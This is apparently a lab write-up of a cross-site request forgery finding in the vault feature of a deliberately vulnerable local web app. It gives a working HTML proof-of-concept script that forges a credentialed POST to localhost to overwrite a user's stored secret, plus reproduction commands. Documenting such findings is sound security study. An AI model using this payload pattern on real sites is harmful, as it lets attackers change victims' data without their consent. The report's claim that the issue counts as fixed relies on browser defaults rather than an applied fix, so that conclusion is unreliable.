# CSRF in the vault — (Working only on sameSite, Low)

## Description

The `/vault` feature lets a logged-in user store a personal secret and view it
later. If an attacker creates an HTML page storing a `<script>` payload which executes a POST request to the vault  and a logged-in user visits that page, the attacker can modify the user's secret. This only works if the attacker's page and the server are on the same site (same protocol and same domain), so in reality this is not really a flaw and that's thanks to the browser which puts the cookie attribute SameSite=Lax by default, so the cross-site POST request won't be executed

## Exploit

Script: `attacks/CSRF.html`

```html
<!doctype html>
<head>
  <title>CSRF ATTACK</title>
</head>

<script>
  const formData = new FormData();
  const url = "http://localhost:3000/vault";

  formData.append("secret", "CSRF executed");
  fetch(url, {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "secret=CSRF executed",
  });
</script>
``` 

To reproduce:

```bash
git checkout v1-vulnerable && node server.js
cd attacks && python -m http.server 8000
```

## Impact

As I said this is **CSRF** working only if the attacker's page and the server are on the same site, so this is not a vulnerability in the server which could be exploited.

It would be really dangerous with SameSite=None because the attacker's page and the server could be on different sites, so if a logged-in user would open the exploit page the attackers could do anything in the site

## Fix

✅ **Fixed** — We understood, this is not a real vulnerability so we can consider it fixed but we could add CSRF-Token and i will be doing it soon 